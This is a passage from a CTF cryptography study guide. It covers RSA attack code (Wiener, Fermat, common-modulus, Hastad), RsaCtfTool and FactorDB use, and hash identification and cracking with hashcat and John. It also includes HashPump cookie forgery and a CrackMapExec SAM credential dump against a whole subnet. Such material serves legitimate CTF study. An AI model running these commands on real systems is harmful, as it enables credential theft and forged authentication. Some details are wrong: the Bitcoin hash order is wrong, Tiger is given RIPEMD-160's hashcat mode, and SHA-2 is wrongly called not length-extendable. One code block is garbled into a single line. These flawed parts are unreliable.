gpg --batch --generate-key keygen-params

# List keys
gpg --list-keys
gpg --list-secret-keys

# Export public key
gpg --export --armor user@example.com > public.asc
gpg --export user@example.com > public.gpg

# Export private key
gpg --export-secret-keys --armor user@example.com > private.asc

# Import keys
gpg --import public.asc
gpg --import private.asc
```

**Encryption and Decryption**

```bash
# Encrypt file for recipient
gpg --encrypt --recipient user@example.com file.txt

# Encrypt with armor (ASCII output)
gpg --encrypt --armor --recipient user@example.com file.txt

# Decrypt
gpg --decrypt file.txt.gpg > decrypted.txt
gpg --decrypt --output decrypted.txt file.txt.gpg

# Sign and encrypt
gpg --sign --encrypt --recipient user@example.com file.txt

# Verify signature
gpg --verify file.txt.sig file.txt
```

### SSH Key Operations

**Key Generation**

```bash
# Generate RSA SSH key pair (default 3072 bits in modern OpenSSH)
ssh-keygen -t rsa -b 4096 -f ctf_key

# Generate without passphrase (CTF scenario)
ssh-keygen -t rsa -b 2048 -f ctf_key -N ""

# Generate with specific comment
ssh-keygen -t rsa -b 2048 -f ctf_key -C "ctf@challenge"

# Generate older format (PEM, not OpenSSH format)
ssh-keygen -t rsa -b 2048 -f ctf_key -m PEM
```

**Key Conversion and Analysis**

```bash
# Convert SSH public key to PEM format
ssh-keygen -f id_rsa.pub -e -m PEM > public.pem

# Convert PEM public key to SSH format
ssh-keygen -f public.pem -i -m PEM > id_rsa.pub

# Extract public key from private key
ssh-keygen -y -f id_rsa > id_rsa.pub

# Show fingerprint
ssh-keygen -lf id_rsa.pub
ssh-keygen -lf id_rsa

# View key in different formats
ssh-keygen -lf id_rsa -E md5
ssh-keygen -lf id_rsa -E sha256
```

**Converting Between OpenSSL and SSH Formats**

```bash
# SSH private key to OpenSSL PEM
ssh-keygen -p -m PEM -f id_rsa

# OpenSSL private key can be used directly with ssh-keygen
openssl rsa -in private.pem -out id_rsa

# Extract SSH public key from OpenSSL private key
ssh-keygen -y -f private.pem > id_rsa.pub
```

### FactorDB Integration

**Online Factorization Database**

FactorDB (http://factordb.com/) stores known factorizations of large numbers. [Unverified: Exact database size and coverage claims cannot be confirmed]

```python
# Python script to query FactorDB
import requests
import re

def factordb_query(n):
    """Query FactorDB for factors of n"""
    url = f"http://factordb.com/index.php?query={n}"
    response = requests.get(url)
    
    # Parse response for factors
    if "FF" in response.text:  # Fully factored
        # Extract factors from HTML
        factors = re.findall(r'<a href="index.php\?id=\d+">(\d+)</a>', response.text)
        return [int(f) for f in factors]
    return None

# Example usage
n = 123456789012345678901234567890123456789
factors = factordb_query(n)
if factors:
    print(f"Factors found: {factors}")
```

**Manual Web Interface Usage**

1. Navigate to http://factordb.com/
2. Enter modulus value in search box
3. Check status:
    - **FF** (Fully Factored): All prime factors known
    - **CF** (Composite, Factorization incomplete): Partially factored
    - **C** (Composite): Not factored
    - **P** (Probable prime)
    - **Prp** (Probably prime)

### RsaCtfTool

**Installation**

```bash
git clone https://github.com/RsaCtfTool/RsaCtfTool.git
cd RsaCtfTool
pip3 install -r requirements.txt
```

**Basic Usage**

```bash
# Attack with public key file
python3 RsaCtfTool.py --publickey public.pem --private

# Attack with direct parameters
python3 RsaCtfTool.py -n 123456789 -e 65537 --private

# Decrypt ciphertext
python3 RsaCtfTool.py --publickey public.pem --uncipherfile ciphertext.bin

# Multiple public keys (common modulus attack, etc.)
python3 RsaCtfTool.py --publickey key1.pem --publickey key2.pem --private

# Specify attack methods
python3 RsaCtfTool.py --publickey public.pem --private --attack wiener
python3 RsaCtfTool.py --publickey public.pem --private --attack factordb
python3 RsaCtfTool.py --publickey public.pem --private --attack pastctfprimes

# Output formats
python3 RsaCtfTool.py --publickey public.pem --private --output private.pem
python3 RsaCtfTool.py -n 12345 -e 65537 --private --dumpkey --output key.pem
```

**Advanced Attack Options**

```bash
# List all available attacks
python3 RsaCtfTool.py --listattacks

# Specific attack categories:
# - Factorization: factordb, fermat, pollard_p_1, williams_p_1
# - Small exponent: hastads, stereotyped, franklin_reiter
# - Weak parameters: wiener, boneh_durfee, small_q
# - Multiple keys: common_modulus, common_factors
# - Side channel: partial_key_exposure, known_phi

# Timeout per attack (seconds)
python3 RsaCtfTool.py --publickey public.pem --private --timeout 300

# Enable verbose output
python3 RsaCtfTool.py --publickey public.pem --private -v
```

### SageMath for RSA Cryptanalysis

**Installation**

```bash
# Debian/Ubuntu
sudo apt install sagemath

# Or use Docker
docker pull sagemath/sagemath
docker run -it sagemath/sagemath
```

**Basic RSA Operations**

```python
# Launch SageMath
# sage

# Define RSA parameters
n = 123456789012345678901234567890123456789
e = 65537
c = 987654321098765432109876543210987654321

# Factor small modulus
factor(n)

# Compute modular inverse (for d calculation)
phi = (p-1) * (q-1)
d = inverse_mod(e, phi)

# Decrypt
m = power_mod(c, d, n)
print(m)

# Convert integer to bytes
from Crypto.Util.number import long_to_bytes
plaintext = long_to_bytes(m)
print(plaintext)
```

**Advanced Attacks**

```python
# Wiener's attack (small d)
def wiener_attack(e, n):
    """Implementation of Wiener's attack for small private exponent"""
    from fractions import Fraction
    cf = continued_fraction(Fraction(e, n))
    convergents = cf.convergents()
    
    for frac in convergents:
        k = frac.numerator()
        d = frac.denominator()
        
        if k == 0:
            continue
            
        phi_n = (e * d - 1) / k
        
        # Solve x^2 - phi_n*x + n = 0
        b = n - phi_n + 1
        discriminant = b^2 - 4*n
        
        if discriminant >= 0:
            sqrt_disc = sqrt(discriminant)
            if sqrt_disc in ZZ:
                p = (b + sqrt_disc) / 2
                q = (b - sqrt_disc) / 2
                if p * q == n:
                    return int(d)
    return None

# Fermat's factorization (close primes)
def fermat_factor(n):
    """Factor n when p and q are close"""
    a = ceil(sqrt(n))
    b2 = a^2 - n
    
    while not is_square(b2):
        a += 1
        b2 = a^2 - n
    
    p = a - sqrt(b2)
    q = a + sqrt(b2)
    return int(p), int(q)

# Pollard's p-1 (smooth p-1)
def pollard_p_minus_1(n, B=1000000):
    """Factor n when p-1 has only small prime factors"""
    a = 2
    for j in range(2, B):
        a = power_mod(a, j, n)
        g = gcd(a - 1, n)
        if 1 < g < n:
            return g
    return None
```

### Python PyCryptodome Library

**Installation**

```bash
pip3 install pycryptodome
```

**Basic RSA Operations**

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, PKCS1_v1_5
from Crypto.Util.number import bytes_to_long, long_to_bytes, inverse, GCD

# Generate key pair
key = RSA.generate(2048)
private_key = key
public_key = key.publickey()

# Export keys
private_pem = private_key.export_key()
public_pem = public_key.export_key()

with open('private.pem', 'wb') as f:
    f.write(private_pem)
with open('public.pem', 'wb') as f:
    f.write(public_pem)

# Import keys
with open('private.pem', 'rb') as f:
    private_key = RSA.import_key(f.read())
with open('public.pem', 'rb') as f:
    public_key = RSA.import_key(f.read())

# Access key components
n = public_key.n
e = public_key.e
d = private_key.d
p = private_key.p
q = private_key.q
```

**Encryption and Decryption**

```python
# PKCS#1 OAEP (recommended)
cipher_oaep = PKCS1_OAEP.new(public_key)
ciphertext = cipher_oaep.encrypt(b"Secret message")

decipher_oaep = PKCS1_OAEP.new(private_key)
plaintext = decipher_oaep.decrypt(ciphertext)

# PKCS#1 v1.5 (older, still common in CTFs)
cipher_v15 = PKCS1_v1_5.new(public_key)
ciphertext = cipher_v15.encrypt(b"Secret message")

decipher_v15 = PKCS1_v1_5.new(private_key)
sentinel = b"ERROR"
plaintext = decipher_v15.decrypt(ciphertext, sentinel)

# Raw/Textbook RSA (no padding)
m = bytes_to_long(b"Secret")
c = pow(m, e, n)
m_decrypted = pow(c, d, n)
plaintext = long_to_bytes(m_decrypted)
```

**Manual Key Construction**

```python
# Construct key from known parameters (CTF scenario)
def construct_private_key(p, q, e=65537):
    """Construct RSA private key from p, q, e"""
    n = p * q
    phi = (p - 1) * (q - 1)
    d = inverse(e, phi)
    
    key = RSA.construct((n, e, d, p, q))
    return key

# Example usage
p = 1234567891
q = 9876543211
private_key = construct_private_key(p, q)

# Construct from n, e only (if factored externally)
def construct_from_factors(n, e, p, q):
    """Construct key when you have factored n"""
    phi = (p - 1) * (q - 1)
    d = inverse(e, phi)
    return RSA.construct((n, e, d, p, q))
```

**CTF Attack Implementations**

```python
# Common modulus attack (same n, different e values)
def common_modulus_attack(n, e1, c1, e2, c2):
    """Decrypt when two messages encrypted with same n but different e"""
    from Crypto.Util.number import inverse, GCD
    
    gcd, s1, s2 = GCD(e1, e2)  # Extended GCD
    
    if gcd != 1:
        return None
    
    # Handle negative exponents
    if s1 < 0:
        c1 = inverse(c1, n)
        s1 = -s1
    if s2 < 0:
        c2 = inverse(c2, n)
        s2 = -s2
    
    m = (pow(c1, s1, n) * pow(c2, s2, n)) % n
    return long_to_bytes(m)

# Small e attack (e=3 with small message)
def small_e_attack(c, e, n):
    """Attack when e is small and m^e < n"""
    import gmpy2
    
    # Try to take eth root of c
    m, exact = gmpy2.iroot(c, e)
    if exact:
        return long_to_bytes(int(m))
    
    # Try with k*n added
    for k in range(1000):
        m, exact = gmpy2.iroot(c + k*n, e)
        if exact:
            return long_to_bytes(int(m))
    return None

# Hastad's broadcast attack (same message, different n and e)
def hastads_attack(c_list, n_list, e=3):
    """Attack when same message sent to multiple recipients with e=3"""
    from functools import reduce
    
    # Chinese Remainder Theorem
    N = reduce(lambda a, b: a * b, n_list)
    result = 0
    
    for c, n in zip(c_list, n_list):
        Ni = N // n
        result += c * Ni * inverse(Ni, n)
    
    result = result % N
    
    # Take cube root
    import gmpy2
    m, exact = gmpy2.iroot(result, e)
    if exact:
        return long_to_bytes(int(m))
    return None
```

### Cracking-RSA Toolkit

**Installation**

```bash
git clone https://github.com/3ximus/cracking-RSA.git
cd cracking-RSA
chmod +x cracking-rsa.py
```

**Usage**

```bash
# Basic attack with public key
./cracking-rsa.py -k public.pem

# With ciphertext file
./cracking-rsa.py -k public.pem -c ciphertext.txt

# Specify parameters directly
./cracking-rsa.py -n 123456789 -e 65537

# Custom attack selection
./cracking-rsa.py -k public.pem --attack wiener
./cracking-rsa.py -k public.pem --attack fermat

# Output decrypted message
./cracking-rsa.py -k public.pem -c cipher.txt -o plaintext.txt
```

**Common CTF Attack Patterns**

```python
# Template for CTF RSA challenges
import requests
from Crypto.PublicKey import RSA
from Crypto.Util.number import *

# 1. Extract parameters from PEM file
with open('pubkey.pem', 'rb') as f:
    key = RSA.import_key(f.read())
    n = key.n
    e = key.e

# 2. Try FactorDB
def check_factordb(n):
    r = requests.get(f'http://factordb.com/index.php?query={n}')
    if 'FF' in r.text:
        print("[+] Found in FactorDB!")
        return True
    return False

# 3. Check for small factors
def trial_division(n, limit=100000):
    for p in range(2, limit):
        if n % p == 0:
            return p, n // p
    return None, None

# 4. Check if primes are close (Fermat)
def is_fermat_vulnerable(n):
    import gmpy2
    sqrt_n = gmpy2.isqrt(n)
    if (sqrt_n + 1) ** 2 - n < n // 2:
        return True
    return False

# 5. Full CTF solving template
def solve_rsa_ctf(n, e, c):
    """Template for solving RSA CTF challenges"""
    # Try factordb first
    if check_factordb(n):
        # Manually input factors from factordb
        pass
    
    # Try small factors
    p, q = trial_division(n)
    if p:
        print(f"[+] Factored: p={p}, q={q}")
        phi = (p-1) * (q-1)
        d = inverse(e, phi)
        m = pow(c, d, n)
        return long_to_bytes(m)
    
    # Try Fermat
    if is_fermat_vulnerable(n):
        print("[!] Try Fermat's method")
    
    # Try Wiener
    if e > n // 2:
        print("[!] Large e, try Wiener attack")
    
    return None
```

---

**Important Subtopics for Further Study:**

- RSA padding oracle attacks (Bleichenbacher, ROBOT)
- Coppersmith's attack for stereotyped messages
- Fault attacks on RSA-CRT implementations
- Timing attacks against RSA implementations
- LSB oracle attacks for full plaintext recovery

---

# HASHING & MESSAGE AUTHENTICATION

## Hash Functions

### Overview and Cryptographic Properties

Hash functions are one-way mathematical algorithms that transform arbitrary-length input data into fixed-length output values (digests). In CTF contexts, you'll encounter hash functions in authentication bypass, data integrity verification, password cracking, and collision-based exploits.

**Core properties assessed in CTF challenges:**

- **Pre-image resistance**: Computationally infeasible to find input from hash output
- **Second pre-image resistance**: Cannot find different input producing same hash
- **Collision resistance**: Cannot find two different inputs producing identical hashes

### MD5 (Broken)

MD5 produces 128-bit (32 hexadecimal character) hashes. Cryptographically broken since 2004 due to practical collision attacks.

**Common CTF exploitation vectors:**

**Hash identification:**

```bash
# Identify hash type
hashid 5f4dcc3b5aa765d61d8327deb882cf99
hash-identifier
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashid

# Generate MD5 hash
echo -n "password" | md5sum
md5sum filename.txt
```

**Collision attacks:**

```bash
# FastColl - generates MD5 collision pairs from identical prefix
git clone https://github.com/cr-marcstevens/hashclash
cd hashclash/scripts
./fastcoll_v1.0.0.5.exe -p prefix.bin -o collision1.bin collision2.bin

# HashClash - chosen-prefix collisions
./md5_chosen_prefix.sh prefix1.bin prefix2.bin
```

**Password cracking:**

```bash
# Hashcat - MD5 cracking (mode 0)
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a  # Brute-force 6 chars

# John the Ripper
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=raw-md5 --incremental hashes.txt

# Online rainbow tables (offline attack simulation)
# Search pre-computed tables at crackstation.net, md5decrypt.net
```

**Length extension attacks (MD5 vulnerable):**

```bash
# HashPump - exploits Merkle-Damgård construction
hashpump -s 'original_hash' -d 'known_data' -a 'data_to_append' -k 16

# Example: Cookie forgery
hashpump -s '6d5f807e23db210bc254a28be2d6759a' \
         -d 'user=guest' \
         -a '&admin=true' \
         -k 10  # Key length unknown, iterate
```

**CTF-specific MD5 challenges:**

- **Magic hashes**: PHP type juggling with hashes starting `0e` (interpreted as scientific notation)
    
    ```bash
    # Find MD5 hash starting with 0e (appears as 0 in loose comparison)# Example: md5("240610708") = 0e462097431906509019562988736854echo -n "240610708" | md5sum
    ```
    

### SHA-1 (Deprecated)

SHA-1 produces 160-bit (40 hex character) hashes. Deprecated since 2017 after Google's SHAttered collision attack.

**Identification and generation:**

```bash
# Identify SHA-1
hashid da39a3ee5e6b4b0d3255bfef95601890afd80709

# Generate SHA-1
echo -n "password" | sha1sum
sha1sum filename.txt
openssl dgst -sha1 file.bin
```

**Collision exploitation:**

```bash
# SHAttered collision files (PDF prefix collision)
wget https://shattered.io/static/shattered-1.pdf
wget https://shattered.io/static/shattered-2.pdf
sha1sum shattered-1.pdf shattered-2.pdf  # Identical SHA-1

# Use in CTF: Upload collision files to bypass hash-based integrity
```

**Password cracking:**

```bash
# Hashcat - SHA-1 (mode 100)
hashcat -m 100 -a 0 hashes.txt rockyou.txt
hashcat -m 100 -a 6 hashes.txt rockyou.txt ?d?d?d?d  # Hybrid attack

# John the Ripper
john --format=raw-sha1 hashes.txt --wordlist=custom.txt
```

**Length extension vulnerability:**

```bash
# SHA-1 uses Merkle-Damgård - vulnerable like MD5
hash_extender -f sha1 -s 'original_hash' -d 'known_data' -a 'append' -l 20
```

### SHA-2 Family (SHA-256, SHA-512)

SHA-2 family includes SHA-224, SHA-256, SHA-384, SHA-512. Currently secure against collision attacks. SHA-256 (256-bit) and SHA-512 (512-bit) most common in CTFs.

**Identification:**

```bash
# SHA-256 - 64 hex characters
hashid 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8

# SHA-512 - 128 hex characters
hashid cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e
```

**Generation:**

```bash
# SHA-256
echo -n "password" | sha256sum
sha256sum file.txt
openssl dgst -sha256 file.bin

# SHA-512
echo -n "password" | sha512sum
openssl dgst -sha512 file.bin
```

**Password cracking:**

```bash
# Hashcat SHA-256 (mode 1400), SHA-512 (mode 1700)
hashcat -m 1400 -a 0 sha256hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1700 -a 3 sha512hash.txt ?u?l?l?l?l?d?d?d?s  # Mask attack

# John the Ripper
john --format=raw-sha256 hashes.txt --wordlist=wordlist.txt
john --format=raw-sha512 --rules=best64 hashes.txt --wordlist=rockyou.txt
```

**CTF challenge patterns:**

**Partial hash matching:**

```python
# Find input where SHA-256 starts with specific bytes
import hashlib
target_prefix = "000000"
nonce = 0
while True:
    data = f"challenge_string{nonce}"
    h = hashlib.sha256(data.encode()).hexdigest()
    if h.startswith(target_prefix):
        print(f"Found: {data}, Hash: {h}")
        break
    nonce += 1
```

**HMAC verification bypass:**

```bash
# HMAC-SHA256 - requires secret key
echo -n "message" | openssl dgst -sha256 -hmac "secret_key"

# Timing attack detection (less relevant for SHA-2)
python timing_attack.py --url http://target/verify --hash-param signature
```

**[Unverified]** SHA-2 is not vulnerable to length extension attacks in the same way as MD5/SHA-1 due to different padding schemes, though **[Inference]** implementation flaws may still exist in specific applications.

### SHA-3 (Keccak)

SHA-3 uses the Keccak sponge construction (fundamentally different from Merkle-Damgård used in MD5/SHA-1/SHA-2). Produces various output lengths: SHA3-224, SHA3-256, SHA3-384, SHA3-512.

**Generation:**

```bash
# OpenSSL (version 1.1.1+)
echo -n "password" | openssl dgst -sha3-256
openssl dgst -sha3-512 file.bin

# Python hashlib
python3 -c "import hashlib; print(hashlib.sha3_256(b'password').hexdigest())"

# RHash tool
rhash --sha3-256 file.txt
```

**Identification:**

```bash
# SHA3-256: 64 hex characters (same length as SHA-256)
# SHA3-512: 128 hex characters (same length as SHA-512)
# Cannot distinguish from SHA-2 by length alone - context required

hashid a7ffc6f8bf1ed76651c14756a061d662f580ff4de43b49fa82d80a4b80f8434a
# Output may show both SHA-256 and SHA3-256 possibilities
```

**Password cracking:**

```bash
# Hashcat SHA3-256 (mode 17400), SHA3-512 (mode 17600)
hashcat -m 17400 -a 0 sha3_hashes.txt rockyou.txt
hashcat -m 17600 -a 3 hash.txt ?a?a?a?a?a?a?a?a

# John the Ripper (requires jumbo version)
john --format=raw-sha3 hashes.txt --wordlist=wordlist.txt
```

**Keccak sponge construction advantages:**

- **Not vulnerable to length extension attacks** - sponge construction processes entire input differently
- **Side-channel resistance** - more uniform computational cost
- **Flexibility** - arbitrary output length support

**CTF-specific SHA-3 scenarios:**

**Distinguishing SHA-2 vs SHA-3:**

```python
# If source code available, check library calls
# SHA-2: hashlib.sha256() or Crypto.Hash.SHA256
# SHA-3: hashlib.sha3_256()

import hashlib
test = b"test"
print("SHA-256:", hashlib.sha256(test).hexdigest())
print("SHA3-256:", hashlib.sha3_256(test).hexdigest())
# Different outputs for same input
```

**XOF (Extendable-Output Functions):**

```python
# SHAKE128 and SHAKE256 - variable length output
import hashlib
shake = hashlib.shake_256(b"data")
print(shake.hexdigest(32))  # 32-byte output
print(shake.hexdigest(64))  # 64-byte output - DIFFERENT values
```

### Cross-Hash Analysis Tools

**Multi-hash identification:**

```bash
# haiti - modern hash identifier
haiti '5f4dcc3b5aa765d61d8327deb882cf99'

# hashID with modes
hashid -m 'hash_value'  # Shows Hashcat modes
```

**Automated cracking workflows:**

```bash
# CrackMapExec - network hash extraction and cracking
crackmapexec smb 192.168.1.0/24 -u user -p pass --sam

# Hashcat benchmark for algorithm comparison
hashcat -b -m 0    # MD5 speed
hashcat -b -m 1400 # SHA-256 speed
hashcat -b -m 17400 # SHA3-256 speed
```

### Practical CTF Hash Exploitation Workflow

1. **Hash identification**: Use `hashid`, `hash-identifier`, or analyze length/context
2. **Check for known weaknesses**: MD5/SHA-1 collision databases, magic hashes
3. **Attempt wordlist attack**: Start with rockyou.txt, domain-specific lists
4. **Rule-based mutations**: Apply John/Hashcat rules for variations
5. **Mask attacks**: If password format known (e.g., 8 chars, starts with capital)
6. **Hybrid attacks**: Combine wordlist + masks
7. **Length extension**: Test if application vulnerable (MD5/SHA-1/SHA-2)
8. **Rainbow tables**: Pre-computed hashes for common passwords

### Important Subtopics for Advanced Exploitation

- **Salted hashes and PBKDF2/bcrypt/Argon2 cracking** (modern password storage)
- **HMAC timing attacks** (side-channel exploitation)
- **Hash collision exploitation in digital signatures** (certificate forgery)
- **Blockchain proof-of-work mechanics** (SHA-256 partial collision mining)

---

### BLAKE2

BLAKE2 is a cryptographic hash function optimized for speed, offering better performance than MD5 while maintaining SHA-3 level security. Available in two variants: BLAKE2b (optimized for 64-bit platforms, up to 512-bit output) and BLAKE2s (optimized for 8-32 bit platforms, up to 256-bit output).

**Identification:**

```bash
# BLAKE2b-256: 64 hex characters
# BLAKE2b-512: 128 hex characters  
# BLAKE2s-256: 64 hex characters
# Length alone cannot distinguish from SHA-2/SHA-3 - requires context

hashid 0e5751c026e543b2e8ab2eb06099daa1d1e5df47778f7787faab45cdf12fe3a8
# May show multiple possibilities - examine source code/documentation
```

**Generation:**

```bash
# b2sum utility (BLAKE2b)
echo -n "password" | b2sum
b2sum -l 256 file.txt  # 256-bit output
b2sum -l 512 file.txt  # 512-bit output (default)

# Python hashlib (Python 3.6+)
python3 -c "import hashlib; print(hashlib.blake2b(b'password').hexdigest())"
python3 -c "import hashlib; print(hashlib.blake2s(b'password').hexdigest())"

# With custom output length
python3 -c "import hashlib; print(hashlib.blake2b(b'data', digest_size=32).hexdigest())"

# OpenSSL (not natively supported - use external tools)
```

**Keyed hashing (MAC mode):**

```python
# BLAKE2 supports keyed hashing natively
import hashlib

key = b"secret_key_16bytes"
message = b"authenticated message"

# BLAKE2b MAC
mac = hashlib.blake2b(message, key=key, digest_size=32)
print(f"BLAKE2b MAC: {mac.hexdigest()}")

# BLAKE2s MAC  
mac = hashlib.blake2s(message, key=key, digest_size=16)
print(f"BLAKE2s MAC: {mac.hexdigest()}")
```

**Password cracking:**

```bash
# Hashcat BLAKE2b-512 (mode 600)
hashcat -m 600 -a 0 blake2_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 600 -a 3 hash.txt ?a?a?a?a?a?a?a?a

# John the Ripper (jumbo version required)
john --format=raw-blake2 hashes.txt --wordlist=wordlist.txt
```

**CTF exploitation scenarios:**

**Personalization parameter abuse:**

```python
# BLAKE2 supports personalization string - can affect hash output
import hashlib

data = b"same_input"
h1 = hashlib.blake2b(data, person=b"app1").hexdigest()
h2 = hashlib.blake2b(data, person=b"app2").hexdigest()
print(f"Person app1: {h1}")
print(f"Person app2: {h2}")
# Different outputs - check if CTF challenge uses personalization
```

**Salt parameter exploitation:**

```python
# BLAKE2 has built-in salt parameter (different from password salting)
import hashlib

salt = b"random_salt_val"
h = hashlib.blake2b(b"password", salt=salt, digest_size=32)
print(h.hexdigest())

# If salt is known/predictable, include in cracking wordlist preprocessing
```

**Tree hashing mode:**

```python
# BLAKE2 supports parallel tree hashing - rare in CTF but possible
import hashlib

# Standard sequential hashing
h_standard = hashlib.blake2b(b"data" * 1000).hexdigest()

# Tree mode parameters: fanout, depth, leaf_size, node_offset, inner_size
# [Unverified] Tree mode implementation varies by library
```

### RIPEMD

RIPEMD (RACE Integrity Primitives Evaluation Message Digest) family includes RIPEMD-128, RIPEMD-160, RIPEMD-256, and RIPEMD-320. RIPEMD-160 most commonly encountered, particularly in Bitcoin address generation.

**Identification:**

```bash
# RIPEMD-128: 32 hex characters (same as MD5)
# RIPEMD-160: 40 hex characters (same as SHA-1)
# RIPEMD-256: 64 hex characters (same as SHA-256)
# RIPEMD-320: 80 hex characters

hashid 108f07b8382412612c048d07d13f814118445acd
# Likely RIPEMD-160 based on context
```

**Generation:**

```bash
# OpenSSL
echo -n "password" | openssl dgst -ripemd160
openssl dgst -rmd160 file.bin  # Alternative flag

# RHash
rhash --ripemd160 file.txt

# Python hashlib
python3 -c "import hashlib; print(hashlib.new('ripemd160', b'password').hexdigest())"
```

**Password cracking:**

```bash
# Hashcat RIPEMD-160 (mode 6000)
hashcat -m 6000 -a 0 ripemd_hashes.txt rockyou.txt
hashcat -m 6000 -a 3 hash.txt ?u?l?l?l?l?d?d?d?d

# John the Ripper
john --format=ripemd-160 hashes.txt --wordlist=wordlist.txt
```

**Bitcoin address context:**

```python
# RIPEMD-160 used in Bitcoin address generation (after SHA-256)
import hashlib

# Bitcoin address generation (simplified)
public_key = bytes.fromhex("0450863ad64a87ae8a2fe83c1af1a8403cb53f53e486d8511dad8a04887e5b23522cd470243453a299fa9e77237716103abc11a1df38855ed6f2ee187e9c582ba6")

# Step 1: SHA-256 of public key
sha256_hash = hashlib.sha256(public_key).digest()

# Step 2: RIPEMD-160 of result
ripemd160_hash = hashlib.new('ripemd160', sha256_hash).digest()
print(f"Public Key Hash: {ripemd160_hash.hex()}")

# Full address requires Base58Check encoding
```

**CTF exploitation patterns:**

**Double-hash weaknesses:**

```bash
# Bitcoin uses SHA-256(RIPEMD-160(SHA-256(pubkey)))
# [Inference] Challenges may involve reversing partial hash chains
# or exploiting weak intermediate values
```

**Length extension testing:**

```python
# [Inference] RIPEMD-160 uses Merkle-Damgård construction
# Potentially vulnerable to length extension like MD5/SHA-1

# Test with hash_extender
hash_extender -f ripemd160 -s 'known_hash' -d 'known_data' -a 'append_data' -l 16
```

### Whirlpool

Whirlpool is a 512-bit cryptographic hash function designed by Vincent Rijmen (AES co-creator) and Paulo Barreto. Uses modified AES cipher in Miyaguchi-Preneel construction.

**Identification:**

```bash
# Whirlpool: 128 hex characters (512 bits)
# Same length as SHA-512 - context required for distinction

hashid 19fa61d75522a4669b44e39c1d2e1726c530232130d407f89afee0964997f7a73e83be698b288febcf88e3e03c4f0757ea8964e59b63d93708b138cc42a66eb3
```

**Generation:**

```bash
# RHash
rhash --whirlpool file.txt
echo -n "password" | rhash --whirlpool -

# OpenSSL (older versions, may not be available)
openssl dgst -whirlpool file.bin

# Python hashlib (requires additional library)
pip3 install whirlpool
```

```python
# Python generation
import hashlib

# Method 1: If available in hashlib
try:
    h = hashlib.new('whirlpool', b'password')
    print(h.hexdigest())
except ValueError:
    print("Whirlpool not available in this hashlib build")

# Method 2: External library
from Crypto.Hash import Whirlpool
h = Whirlpool.new(b'password')
print(h.hexdigest())
```

**Password cracking:**

```bash
# Hashcat Whirlpool (mode 6100)
hashcat -m 6100 -a 0 whirlpool_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 6100 -a 3 hash.txt ?a?a?a?a?a?a?a?a

# John the Ripper (jumbo version)
john --format=whirlpool hashes.txt --wordlist=custom.txt
```

**CTF considerations:**

**Distinguishing Whirlpool from SHA-512:**

```python
import hashlib
from Crypto.Hash import Whirlpool

test_input = b"test_data"

sha512 = hashlib.sha512(test_input).hexdigest()
whirlpool = Whirlpool.new(test_input).hexdigest()

print(f"SHA-512:   {sha512}")
print(f"Whirlpool: {whirlpool}")
# Same length, different values
```

**Performance characteristics:**

```bash
# Whirlpool is significantly slower than SHA-512
# Useful for identifying hash type through timing side-channels

time echo -n "data" | rhash --sha512 -
time echo -n "data" | rhash --whirlpool -
# [Unverified] Timing differences may be observable in network requests
```

**AES-based construction:**

```python
# [Inference] Since Whirlpool uses modified AES internally,
# vulnerabilities in AES implementations might theoretically affect Whirlpool
# though no practical attacks are known
```

### Tiger

Tiger is a 192-bit cryptographic hash function designed for 64-bit platforms, optimized for speed. Variants include Tiger/192, Tiger/160, and Tiger/128 (truncated versions).

**Identification:**

```bash
# Tiger/192: 48 hex characters
# Tiger/160: 40 hex characters (same as SHA-1/RIPEMD-160)
# Tiger/128: 32 hex characters (same as MD5/RIPEMD-128)

hashid 24f0130c63ac933216166e76b1bb925ff373de2d49584e7a
# 48 chars = likely Tiger/192
```

**Generation:**

```bash
# RHash
rhash --tiger file.txt
echo -n "password" | rhash --tiger -

# Tiger-tree-hash (TTH) variant for file verification
rhash --tth file.bin

# Python (requires external library)
pip3 install python-tiger
```

```python
# Python generation
import hashlib

# Using hashlib if available (uncommon)
try:
    h = hashlib.new('tiger192', b'password')
    print(h.hexdigest())
except ValueError:
    print("Tiger not in this hashlib build")

# Alternative: ctypes wrapper or external library
from tiger import hash as tiger_hash
result = tiger_hash(b"password")
print(result.hex())
```

**Password cracking:**

```bash
# Hashcat Tiger-192 (mode 6000 - [Unverified] check latest hashcat docs)
# [Unverified] Tiger support may vary by hashcat version
hashcat -m 6000 -a 0 tiger_hashes.txt rockyou.txt

# John the Ripper (jumbo version may support)
john --format=tiger hashes.txt --wordlist=wordlist.txt
# [Unverified] Format name may vary - check with john --list=formats
```

**Tiger Tree Hash (TTH):**

```bash
# Used in peer-to-peer file sharing (DC++, GNUtella)
# Merkle tree of Tiger hashes for chunk verification

rhash --tth large_file.iso

# Verify chunks independently
rhash --tth --chunk-size=1024 file.bin
```

**CTF exploitation scenarios:**

**TTH collision exploitation:**

```python
# [Inference] TTH uses Merkle tree structure
# Potential for second-preimage attacks on internal nodes
# if tree depth and chunk sizes are manipulated

# Example structure (conceptual):
# Root = Tiger(Tiger(chunk1) || Tiger(chunk2))
```

**Truncated Tiger variants:**

```python
# Tiger/160 and Tiger/128 are truncated versions
# [Inference] Truncation may reduce collision resistance

import os

# If implementing Tiger truncation
full_tiger = b'\x24\xf0\x13\x0c...'  # 24 bytes (192 bits)
tiger160 = full_tiger[:20]  # 160 bits
tiger128 = full_tiger[:16]  # 128 bits
```

**Platform-specific optimizations:**

```bash
# Tiger designed for 64-bit - may have side-channel differences on 32-bit
# [Speculation] Timing attacks might distinguish platform architecture
```

### Cross-Algorithm Analysis

**Hash length comparison table:**

```
Algorithm        | Output Bits | Hex Chars | Security Status
-----------------|-------------|-----------|------------------
MD5              | 128         | 32        | Broken
RIPEMD-128       | 128         | 32        | [Unverified] Weak
Tiger/128        | 128         | 32        | Limited use
SHA-1            | 160         | 40        | Deprecated
RIPEMD-160       | 160         | 40        | Secure (limited)
Tiger/160        | 160         | 40        | Limited use
Tiger/192        | 192         | 48        | Limited use
SHA-256          | 256         | 64        | Secure
